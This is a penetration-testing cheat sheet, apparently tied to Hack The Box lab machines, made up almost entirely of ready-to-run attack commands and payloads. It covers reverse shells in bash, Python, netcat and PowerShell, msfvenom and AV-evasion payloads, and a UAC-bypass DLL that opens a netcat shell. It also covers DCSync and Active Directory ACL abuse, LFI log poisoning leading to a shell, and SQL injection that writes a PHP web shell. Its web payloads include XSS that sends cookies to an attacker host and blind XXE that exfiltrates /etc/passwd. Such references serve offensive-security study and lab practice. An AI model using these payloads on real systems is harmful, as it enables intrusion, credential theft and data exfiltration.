---
layout: cheatsheet
title: 📜
permalink: /cheatsheet
---

[//]: # (# -- 4 spaces before)
[//]: # (## -- 3 spaces before)
[//]: # (### -- 2 spaces before)
[//]: # (#### -- 1 spaces before)

* TOC
{:toc}




# Pentest



## Reverse Shells


### Bash

```
root@kali:$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
root@kali:$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```


### Netcat

```
root@kali:$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
```


### Python


#### IPv4

```
root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
```


#### IPv6

```
root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
```


### Powershell

Invoke-Expression (UTF-16LE):

```
root@kali:$ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
PS> powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
```

1. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Invoke-WebRequest + `nc.exe` **[1]**:

```
PS> powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
PS> cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
```

1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)


### Meterpreter

Powershell + msfvenom:

```
root@kali:$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=127.0.0.1 LPORT=1337 -f exe > met.exe
PS> (New-Object Net.WebClient).DownloadFile("met.exe", "$env:TEMP\met.exe")
...start metasploit listener...
PS> Start-Process "$env:TEMP\met.exe"
```

Powershell + unicorn **[1]**:

```
root@kali:$ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
root@kali:$ service postgresql start
root@kali:$ msfconsole -r unicorn.rc
PS> powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_attack.txt')
```

1. [github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)


### Listeners

```
root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
```


### Upgrade to PTY

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Or
$ script -q /dev/null sh

user@remote:$ ^Z
(background)

root@kali:$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
(get ROWS and COLS)

root@kali:$ stty raw -echo; fg

(?) user@remote:$ reset

user@remote:$ stty rows ${ROWS} cols ${COLS}

user@remote:$ export TERM=xterm
(or xterm-color or xterm-256color)

(?) user@remote:$ exec /bin/bash [-l]
```

1. [forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
2. [xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)



## SMB


### mount

Mount:

```
root@kali:$ mount -t cifs //127.0.0.1/Users /mnt/smb -v -o user=snovvcrash,[pass=qwe123]
```

Status:

```
root@kali:~# mount -v | grep 'type cifs'
root@kali:~# root@kali:~# df -k -F cifs
```

Unmount:

```
root@kali:~# umount /mnt/smb
```


### impacket-smbserver

SMB server (communicate with Windows **[1]**):

```
root@kali:$ impacket-smbserver -smb2support files `pwd`
```

1. [serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)

Mount SMB in Windows with `net use`:

```
root@kali:$ impacket-smbserver -username snovvcrash -password qwe123 -smb2support share `pwd`
PS> net use Z: \\10.10.14.16\share
PS> net use \\10.10.14.16\share /u:snovvcrash qwe123
```

Mount SMB in Windows with `New-PSDrive`:

```
root@kali:$ impacket-smbserver -username snovvcrash -password qwe123 -smb2support share `pwd`
PS> $pass = 'qwe123' | ConvertTo-SecureString -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
PS> New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
PS> cd Z:
```


### smbmap

Null authentication:

```
root@kali:$ smbmap -H 127.0.0.1 -u anonymous -R
root@kali:$ smbmap -H 127.0.0.1 -u null -p "" -R
```


### smbclient

Null authentication:

```
root@kali:$ smbclient -N -L 127.0.0.1
root@kali:$ smbclient -N '\\127.0.0.1\Data'
```

With user creds:

```
root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' qwe123
```


### crackmapexec

```
root@kali:$ crackmapexec smb -u nullinux_users.txt -p 'qwe123' --shares [--continue-on-success] 127.0.0.1
```

Same password spraying with Metasploit:

* [www.youtube.com/watch?v=fmBb6BgLsC8&t=620](https://www.youtube.com/watch?v=fmBb6BgLsC8&t=620)




## AD


### Impacket

Install latest:

```
root@kali:$ git clone [1]
root@kali:$ python3 -m pip install --upgrade .
```

1. [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)


### Dump Users from DCE/RPC SAMR


#### rpcclient

```
root@kali:$ rpcclient -U "" -N 127.0.0.1
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
```


#### enum4linux

```
root@kali:$ enum4linux -v -a 127.0.0.1 | tee nullinux_users.txt
```


#### nullinux.py

```
root@kali:$ ./nullinux.py 127.0.0.1
```


#### samrdump.py (Impacket)

```
root@kali:$ samrdump.py 127.0.0.1
```


### AS_REP Roasting

GetNPUsers.py (Impacket):

```
root@kali:$ GetNPUsers.py example.local/ -dc-ip 127.0.0.1 -k -no-pass -usersfile users.txt -request -format john -outputfile asrep.hash
root@kali:$ john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Show domain users with `DONT_REQ_PREAUTH` flag with `PowerView.ps1`:

```
PS> . ./PowerView.ps1
PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

1. [github.com/swisskyrepo/PayloadsAllTheThings/blob/master/krb_as_rep-roasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)


### DCSync

Potential risk -- "Exchange Windows Permissions" group:

```
PS> net group "Exchange Windows Permissions" snovvcrash /ADD /DOMAIN
PS> net group "Remote Management Users" snovvcrash /ADD /DOMAIN
Or
PS> Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members snovvcrash
PS> Add-ADGroupMember -Identity 'Remote Management Users' -Members snovvcrash
```

#### Powerview (v2)

```
PS> Add-ObjectAcl -TargetDistinguishedName 'DC=example,DC=local' -PrincipalName snovvcrash -Rights DCSync -Verbose
```

1. [vulndev.io/notes/2019/01/01/ad.html](https://vulndev.io/notes/2019/01/01/ad.html)

#### ntlmrelayx.py + secretsdump.py (Impacket)

```
root@kali:$ ntlmrelayx.py -t ldap://127.0.0.1 --escalate-user snovvcrash
root@kali:$ secretsdump.py example.local/snovvcrash:qwe123@127.0.0.1 -just-dc
```

1. [dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
2. [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)

#### aclpwn.py

```
root@kali:$ aclpwn -f snovvcrash -ft user -t example.local -tt domain -d example.local -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p qwe123 -sp qwe123
```

1. [www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
2. [www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)

#### Manually

1. Получить ACL для корневого объекта (домен).
2. Получить SID для аккаунта, которому нужно дать DCSync.
3. Создать новый ACL и выставить в нем права "Replicating Directory Changes" (GUID `1131f6ad-...`) и "Replicating Directory Changes All" (GUID `1131f6aa-...`) для SID из п. 2.
4. Применить изменения.

```
PS> Import-Module ActiveDirectory
PS> $acl = get-acl "ad:DC=example,DC=local"
PS> $user = Get-ADUser snovvcrash
PS> $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
PS> $objectguid = new-object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
PS> $identity = [System.Security.Principal.IdentityReference] $sid
PS> $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
PS> $type = [System.Security.AccessControl.AccessControlType] "Allow"
PS> $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
PS> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
PS> $acl.AddAccessRule($ace)
PS> $objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
PS> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
PS> $acl.AddAccessRule($ace)
PS> Set-acl -aclobject $acl "ad:DC=example,DC=local"
```

1. [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)

tags: *forest.htb*

#### Mimikatz

```
PS> lsadump::dcsync /domain:example.local /user:krbtgt@example.local
```

1. [adsecurity.org/?p=1729](https://adsecurity.org/?p=1729)
2. [pentestlab.blog/2018/04/09/golden-ticket/](https://pentestlab.blog/2018/04/09/golden-ticket/)

#### MISC

* [www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory](https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory)
* [github.com/fox-it/Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)
* [gist.github.com/monoxgas/9d238accd969550136db](https://gist.github.com/monoxgas/9d238accd969550136db)


### DnsAdmins

```
root@kali:$ msfvenom -p windows/x64/exec cmd='c:\users\snovvcrash\documents\nc.exe 127.0.0.1 1337 -e powershell' -f dll > inject.dll
PS> dnscmd.exe <HOSTNAME> /Config /ServerLevelPluginDll c:\users\snovvcrash\desktop\i.dll
PS> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)

PS> reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
```

1. [medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
2. [www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
3. [ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
4. [adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)

tags: *resolute.htb*


### Azure Admins

PS> . ./Azure-ADConnect.ps1
PS> Azure-ADConnect -server 127.0.0.1 -db ADSync

* [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
* [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)

tags: *moteverde.htb*


### Bloodhound

Setup:

```
root@kali:$ git clone https://github.com/BloodHoundAD/BloodHound
...install [1]...
root@kali:$ neo4j console
...change default password at localhost:7474...
^C
root@kali:$ neo4j start
...download [2]...
root@kali:$ ./BloodHound --no-sandbox
```

1. [neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation)
2. [github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)

Collect graphs via `SharpHound.ps1`:

```
PS> . .\SharpHound.ps1
PS> Invoke-Bloodhound -CollectionMethod All -Domain example.local -LDAPUser snovvcrash -LDAPPass qwe123
```

Collect graphs via `bloodHound.py` **[1]** (with running neo4j):

```
root@kali:$ bloodhound-python -c All -u snovvcrash -p qwe123 -d example.local -ns 127.0.0.1
```

1. [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)


### Tricks

List all domain users:

```
PS> Get-ADUser -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
Or
PS> net user /DOMAIN
```

List all domain groups:

```
PS> Get-ADGroup -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
Or
PS> net group /DOMAIN
```

List all user's groups:

```
PS> Get-ADPrincipalGroupMembership snovvcrash | select Name
```

Create new domain user:

```
PS> net user snovvcrash qwe321456 /ADD /DOMAIN
Or
PS> New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=example,DC=local" -AccountPassword(ConvertTo-SecureString 'qwe321456' -AsPlainText -Force) -Enabled $true
```

#### MISC

* [activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)



## UAC Bypass


### SystemPropertiesAdvanced.exe

#### srrstr.dll

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
	switch(dwReason) {
		case DLL_PROCESS_ATTACH:
			WinExec("C:\\Users\\<USERNAME>\\Documents\\nc.exe 10.10.14.16 1337 -e powershell", 0);
		case DLL_PROCESS_DETACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
	}

	return 0;
}
```

Compile on Kali:

```
root@kali:$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
```

#### DLL Hijacking

Upload `srrstr.dll` to `C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\srrstr.dll` and check it:

```
PS> rundll32.exe srrstr.dll,xyz
```

Exec and get a shell ("requires an interactive window station"):

```
PS> cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

* [egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
* [www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)

tags: *arkham.htb*



## AV Bypass


### msfvenom

```
root@kali:$ msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 3 LHOST=127.0.0.1 LPORT=1337 -f exe --platform win -a x86 -o test.exe
```


### Veil-Evasion

Hyperion + Pescramble

```
root@kali:$ wine hyperion.exe input.exe output.exe
root@kali:$ wine PEScrambler.exe -i input.exe -o output.exe
```


### GreatSCT

Install and generate a payload:

```
root@kali:$ git clone https://github.com/GreatSCT/GreatSCT /opt/GreatSCT
root@kali:$ cd /opt/GreatSCT/setup
root@kali:$ ./setup.sh
root@kali:$ cd .. && ./GreatSCT.py
...generate a payload...
root@kali:$ ls -la /usr/share/greatsct-output/handlers/payload.{rc,xml}

root@kali:$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
```

Exec with `msbuild.exe` and get a shell:

```
PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
```

* [github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [www.youtube.com/watch?v=krC5j1Ab44I&t=3730s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3730s)



## Windows


### ADS

```
PS> Get-Item 'file.txt' -Stream *
PS> Get-Content 'file.txt' -Stream Password
Or
PS> type 'file.txt:Password'
```


### Remote Admin

#### runas

```
PS> runas /netonly /user:snovvcrash powershell
```

#### evil-winrm.rb

```
root@kali:$ ruby evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s ./ -e ./
```

* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

#### psexec.py

```
root@kali:$ psexec.py snovvcrash:qwe123@127.0.0.1
root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
```

* [github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

#### wmiexec.py

```
root@kali:$ wmiexec.py snovvcrash:qwe123@127.0.0.1
root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
```

* [github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)


### Registry

Search for creds:

```
PS> REG QUERY HKLM /f "password" /t REG_SZ /s
PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword"
Or
PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
```

tags: *sauna.htb*


### SDDL

1. [habr.com/ru/company/pm/blog/442662/](https://habr.com/ru/company/pm/blog/442662/)
2. [0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html](https://0xdf.gitlab.io/2020/01/27/digging-into-psexec-with-htb-nest.html)


### Forensics

Powershell history:

```
PS> Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```


### Tricks

File transfer:

```
Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
Cmd> type C:\Windows\Temp\encoded.b64
```



## LFI/RFI


### PHP RFI with SMB

`/etc/samba/smb.conf`:

```
log level = 3
[share]
        comment = TEMP
        path = /tmp/smb
        writable = no
        guest ok = yes
        guest only = yes
        read only = yes
        browsable = yes
        directory mode = 0555
        force user = nobody
```

```
root@kali:$ chmod 0555 /tmp/smb
root@kali:$ chown -R nobody:nogroup /tmp/smb
root@kali:$ service smbd restart
root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
```

* [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)

tags: *sniper.htb*


### Log Poisoning

#### PHP

Access log (needs single `'` instead of double `"`):

```
root@kali:$ nc 127.0.0.1 80
GET /<?php system($_GET['cmd']); ?>

root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
Or
root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
```

Error log:

```
root@kali:$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
Or
root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
```

* [medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
* [outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)

tags: *patents.htb*



## DBMS


### MySQL (MariaDB)

```
root@kali:$ mysql -u snovvcrash -p'qwe123' -e 'show databases;'
```


### SQLite

```
SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='secret_database';
SELECT username,password FROM secret_database;
```



## SQLi


### sqlmap

```
root@kali:$ sqlmap -r request.req --batch -p <PARAM_NAME> --os windows --dbms mysql --passwords --tor --tor-type=SOCKS5
root@kali:$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-dest=C:/Inetpub/wwwroot/backdoor.php
```

* [github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)


### Truncation Attack

```
POST /index.php HTTP/1.1
Host: 127.0.0.1

name=snovvcrash&email=admin%example.com++++++++++11&password=qwe123
```

* [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)

tags: *book.htb*


### Write File

```
id=1' UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
```


### Read File

```
id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
```



## XSS


### Data Grabbers

#### Cookies

Img tag:

```
<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">
```

Fetch:

```javascript
<script>
fetch('https://<SESSION>.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
</script>
```

* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)


### XMLHttpRequest

#### XSS to LFI

```javascript
<script>
var xhr = new XMLHttpRequest;
xhr.onload = function() {
	document.write(this.responseText);
};
xhr.open("GET", "file:///etc/passwd");
xhr.send();
</script>
```

```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText);};x.open("GET","file:///etc/passwd");x.send();</script>
```

* [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)

tags: *book.htb*

#### XSS to CSRF

If the endpoint is accessible only from localhost:

```javascript
<script>
var xhr;
if (window.XMLHttpRequest) {
	xhr = new XMLHttpRequest();
} else {
	xhr = new ActiveXObject("Microsoft.XMLHTTP");
}
xhr.open("POST", "/backdoor.php");
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
</script>
```

tags: *bankrobber.htb*

With capturing CSRF token first:

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('GET', '/email', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@example.com')
};
</script>
```

* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)



## XXE


### Blind XXE OOB with External DTD

Way 1 (general entities):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://10.10.14.253/ext.dtd">
%xxe;
%ext;
]>
<foo>&exfil;</foo>

--- External file ext.dtd (hosted on local machine) ---

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % ext "<!ENTITY exfil SYSTEM 'http://10.10.14.253/?x=%file;'>">
```

Way 2 (parameter entities):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://10.10.14.253/ext.dtd">
%xxe;
]>
<foo></foo>

--- External file ext.dtd (hosted on local machine) ---

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.253/?x=%file;'>">
%ext;
%exfil;
```

* [portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
* [www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)
* [media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
* [medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26](https://medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26)
* [mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)


### Malicious DOC/DOCX

Get `docx` sample and unpack it:

```
root@kali:$ curl https://file-examples.com/wp-content/uploads/2017/02/file-sample_100kB.docx > sample.docx
root@kali:$ unzip sample.docx
```

Create `customXml/` dir with a payload and pack it back:

```
root@kali:$ mkdir customXml
root@kali:$ vi item1.xml
...
root@kali:$ rm malicious.docx; zip -r malicious.docx '[Content_Types].xml' customXml/ docProps/ _rels/ word/
```

* [file-examples.com/index.php/sample-documents-download/sample-doc-download/](https://file-examples.com/index.php/sample-documents-download/sample-doc-download/)
* [stackoverflow.com/a/38797399/6253579](https://stackoverflow.com/a/38797399/6253579)

tags: *patents.htb*



## Metasploit


### Debug

```
root@kali:$ gem install pry-byebug
root@kali:$ vi ~/.pry-byebug
...
```

```ruby
if defined?(PryByebug)
  Pry.commands.alias_command 'c', 'continue'
  Pry.commands.alias_command 's', 'step'
  Pry.commands.alias_command 'n', 'next'
  Pry.commands.alias_command 'f', 'finish'
end

# Hit Enter to repeat last command
Pry::Commands.command /^$/, "repeat last command" do
  _pry_.run_command Pry.history.to_a.last
end
```

```
...
root@kali:$ cp -r /usr/share/metasploit-framework/ /opt
root@kali:$ vi /opt/metasploit-framework/msfconsole
...add "require 'pry-byebug'"...
root@kali:$ mkdir -p ~/.msf4/modules/exploits/linux/http/
root@kali:$ cp /usr/share/metasploit-framework/modules/exploits/linux/http/packageup.rb ~/.msf4/modules/exploits/linux/http/p.rb
root@kali:$ vi ~/.msf4/modules/exploits/linux/http/p.rb
...add "binding.pry"...
```

1. [github.com/deivid-rodriguez/pry-byebug](https://github.com/deivid-rodriguez/pry-byebug)
2. [www.youtube.com/watch?v=QzP5nUEhZeg&t=2190](https://www.youtube.com/watch?v=QzP5nUEhZeg&t=2190)



## Recon


### Windows

Initial:

```
PS> systeminfo
PS> whoami /priv (whoami /all)
PS> PS> gci "$env:userprofile" -recurse | select fullname
PS> net user
PS> net localgroup Administrators
PS> cmdkey /list
PS> wmic product get name
PS> tasklist /SVC
PS> net start
PS> netstat -ano | findstr LIST
PS> ipconfig /all
PS> dir -force c:\
PS> echo $ExecutionContext.SessionState.LanguageMode
```



## PrivEsc


### Linux

#### Dirty COW

* [dirtycow.ninja/](https://dirtycow.ninja/)
* [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
* [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)

#### logrotate

whotwagner/logrotten:

```
$ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
$ gcc lr.c -o lr

$ cat payloadfile
if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi

$ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
```

* [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
